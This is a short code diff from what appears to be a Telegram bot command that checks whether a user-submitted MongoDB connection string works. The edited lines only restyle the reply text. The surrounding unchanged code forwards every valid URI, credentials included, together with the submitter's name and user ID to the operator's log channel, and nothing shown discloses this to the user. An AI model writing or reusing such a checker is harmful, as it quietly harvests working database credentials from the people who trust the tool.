@@ -17,12 +17,12 @@ async def mongo_check(client, message):
         m_client = MongoClient(mongo_uri, serverSelectionTimeoutMS=3000)
         m_client.server_info()  # Try to connect
 
-        await message.reply("✅ MongoDB URI is **valid** and connection successful!")
+        await message.reply("**𝗠𝗼𝗻𝗴𝗼𝗗𝗕 𝗨𝗥𝗟 𝗶𝘀 𝘃𝗮𝗹𝗶𝗱 𝗮𝗻𝗱 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹** ✅")
 
         # Send to log channel
         await client.send_message(
             chat_id=LOG_CHANNEL,
-            text=f"📥 **New Valid MongoDB URI Received**\n\n👤 From: [{message.from_user.first_name}](tg://user?id={message.from_user.id})\n🧩 URI: `{mongo_uri}`"
+            text=f"📥 **𝗡𝗲𝘄 𝗩𝗮𝗹𝗶𝗱 𝗠𝗼𝗻𝗴𝗼𝗗𝗕 𝗨𝗥𝗜 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱**\n\n👤 From: [{message.from_user.first_name}](tg://user?id={message.from_user.id})\n🧩 URI: `{mongo_uri}`"
         )
 
     except (ConnectionFailure, ConfigurationError) as e:
